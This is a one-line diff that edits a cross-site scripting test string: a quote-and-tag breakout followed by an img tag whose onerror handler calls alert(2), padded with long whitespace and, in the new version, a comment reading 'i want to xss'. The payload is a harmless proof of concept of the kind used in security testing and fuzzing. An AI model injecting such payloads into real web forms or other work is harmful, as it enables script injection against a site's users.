@@ -1,1 +1,1 @@
---'"><img src=x                                                                                                                                                           onerror=alert(2)">
+--'"><img src=x /* i want to xss */                                                                                                                                                    onerror=alert(2)">
